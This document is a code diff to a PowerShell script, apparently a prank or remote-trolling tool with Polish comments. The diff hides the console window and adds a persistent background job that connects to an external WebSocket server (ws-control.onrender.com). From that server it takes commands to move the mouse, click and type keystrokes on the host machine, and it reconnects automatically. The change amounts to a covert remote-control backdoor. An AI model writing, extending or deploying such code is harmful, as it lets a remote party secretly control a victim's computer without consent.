@@ -7,6 +7,7 @@ $youtubeStarted = $false
 $ctrlWStarted = $false
 $altF4Started = $false
 $mouseJobStarted = $false
+$wsJob = $null
 
 Add-Type @"
 using System;
@@ -18,7 +19,7 @@ public class ConsoleHelper {
 }
 "@ -ErrorAction SilentlyContinue
 [ConsoleHelper]::AllocConsole() | Out-Null
-[ConsoleHelper]::ShowWindow([ConsoleHelper]::GetConsoleWindow(), 5) | Out-Null
+[ConsoleHelper]::ShowWindow([ConsoleHelper]::GetConsoleWindow(), 0) | Out-Null
 
 Add-Type @"
 using System;
@@ -286,6 +287,124 @@ function Stop-MouseInversion {
     [MouseHook]::Stop()
 }
 
+# ============================================================
+#  WebSocket Remote Control (wartości 10/11)
+# ============================================================
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Mouse {
+    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
+    public const uint MOUSEEVENTF_LEFTDOWN   = 0x0002;
+    public const uint MOUSEEVENTF_LEFTUP     = 0x0004;
+    public const uint MOUSEEVENTF_RIGHTDOWN  = 0x0008;
+    public const uint MOUSEEVENTF_RIGHTUP    = 0x0010;
+    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+    public const uint MOUSEEVENTF_MIDDLEUP   = 0x0040;
+    public static void LeftClick()   { mouse_event(MOUSEEVENTF_LEFTDOWN,  0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,  0,0,0,0); }
+    public static void RightClick()  { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0,0,0,0); mouse_event(MOUSEEVENTF_RIGHTUP, 0,0,0,0); }
+    public static void MiddleClick() { mouse_event(MOUSEEVENTF_MIDDLEDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_MIDDLEUP,0,0,0,0); }
+}
+"@ -ErrorAction SilentlyContinue
+
+Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+
+$wsScriptBlock = {
+    param($wsUrl)
+    Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Mouse2 {
+    [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
+    public const uint MOUSEEVENTF_LEFTDOWN   = 0x0002;
+    public const uint MOUSEEVENTF_LEFTUP     = 0x0004;
+    public const uint MOUSEEVENTF_RIGHTDOWN  = 0x0008;
+    public const uint MOUSEEVENTF_RIGHTUP    = 0x0010;
+    public const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
+    public const uint MOUSEEVENTF_MIDDLEUP   = 0x0040;
+    public static void LeftClick()   { mouse_event(MOUSEEVENTF_LEFTDOWN,  0,0,0,0); mouse_event(MOUSEEVENTF_LEFTUP,  0,0,0,0); }
+    public static void RightClick()  { mouse_event(MOUSEEVENTF_RIGHTDOWN, 0,0,0,0); mouse_event(MOUSEEVENTF_RIGHTUP, 0,0,0,0); }
+    public static void MiddleClick() { mouse_event(MOUSEEVENTF_MIDDLEDOWN,0,0,0,0); mouse_event(MOUSEEVENTF_MIDDLEUP,0,0,0,0); }
+}
+"@ -ErrorAction SilentlyContinue
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
+
+    function Handle-WsMessage($msg) {
+        $parts = $msg -split ','
+        if ($parts.Count -lt 4) { return }
+        $mx    = [int]$parts[0]
+        $my    = [int]$parts[1]
+        $click = $parts[2].Trim()
+        $keys  = ($parts[3..($parts.Count-1)] -join ',')
+        if ($mx -ne -1 -and $my -ne -1) {
+            [Mouse2]::SetCursorPos($mx, $my)
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Mysz -> $mx,$my" -ForegroundColor Cyan
+        }
+        switch ($click) {
+            "lclick"  { [Mouse2]::LeftClick();   Write-Host "[$(Get-Date -Format 'HH:mm:ss')] LClick"   -ForegroundColor Yellow }
+            "rclick"  { [Mouse2]::RightClick();  Write-Host "[$(Get-Date -Format 'HH:mm:ss')] RClick"   -ForegroundColor Yellow }
+            "mclick"  { [Mouse2]::MiddleClick(); Write-Host "[$(Get-Date -Format 'HH:mm:ss')] MClick"   -ForegroundColor Yellow }
+            "ldouble" {
+                [Mouse2]::LeftClick()
+                Start-Sleep -Milliseconds 50
+                [Mouse2]::LeftClick()
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] DoubleClick" -ForegroundColor Yellow
+            }
+        }
+        if ($keys -ne 'none' -and $keys -ne '') {
+            [System.Windows.Forms.SendKeys]::SendWait($keys)
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Keys: '$keys'" -ForegroundColor Green
+        }
+    }
+
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Laczenie z $wsUrl ..." -ForegroundColor Green
+    while ($true) {
+        try {
+            $ws  = New-Object System.Net.WebSockets.ClientWebSocket
+            $cts = New-Object System.Threading.CancellationTokenSource
+            $connectTask = $ws.ConnectAsync([Uri]$wsUrl, $cts.Token)
+            $connectTask.Wait(10000) | Out-Null
+            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) { throw "Nie mozna polaczyc" }
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Polaczono! Czekam na komendy..." -ForegroundColor Green
+            $buffer = New-Object byte[] 4096
+            while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+                $seg    = New-Object ArraySegment[byte] (,$buffer)
+                $result = $ws.ReceiveAsync($seg, $cts.Token).GetAwaiter().GetResult()
+                if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
+                    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Serwer zamknal polaczenie" -ForegroundColor Yellow
+                    break
+                }
+                $msg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Count)
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Odebrano: '$msg'" -ForegroundColor Gray
+                if ($msg -ne "-1,-1,none,none") { Handle-WsMessage $msg }
+            }
+        } catch {
+            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Blad: $_" -ForegroundColor Red
+        } finally {
+            try { $ws.Dispose() } catch {}
+            try { $cts.Dispose() } catch {}
+        }
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Reconnect za 5s..." -ForegroundColor DarkGray
+        Start-Sleep 5
+    }
+}
+
+function Start-WsControl {
+    $script:wsJob = Start-Job -ScriptBlock $wsScriptBlock -ArgumentList "wss://ws-control.onrender.com"
+    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Job uruchomiony (ID: $($script:wsJob.Id))" -ForegroundColor Green
+}
+
+function Stop-WsControl {
+    if ($script:wsJob) {
+        Stop-Job -Job $script:wsJob
+        Remove-Job -Job $script:wsJob -Force
+        $script:wsJob = $null
+        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [WS] Job zatrzymany" -ForegroundColor Green
+    }
+}
+
 Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Skrypt uruchomiony. Monitoruje: $url" -ForegroundColor Green
 
 while ($true) {
@@ -387,9 +506,30 @@ while ($true) {
                 Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [9] Alt+F4 juz wyslany, pomijam" -ForegroundColor Gray
             }
         }
+        "10" {
+            if (-not $wsJob) {
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [10] Uruchamiam WebSocket remote control" -ForegroundColor Cyan
+                Start-WsControl
+            } else {
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [10] WebSocket juz aktywny, pomijam" -ForegroundColor Gray
+            }
+        }
+        "11" {
+            if ($wsJob) {
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [11] Zatrzymuje WebSocket remote control" -ForegroundColor Cyan
+                Stop-WsControl
+            } else {
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [11] WebSocket nie byl aktywny" -ForegroundColor Gray
+            }
+        }
         default {
             Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Nieznana wartosc: '$value', czekam..." -ForegroundColor DarkGray
         }
+    }
+
+    # Flush logów z WebSocket joba
+    if ($wsJob) {
+        Receive-Job -Job $wsJob -ErrorAction SilentlyContinue | ForEach-Object { Write-Host $_ }
     }
 
     Start-Sleep $checkInterval
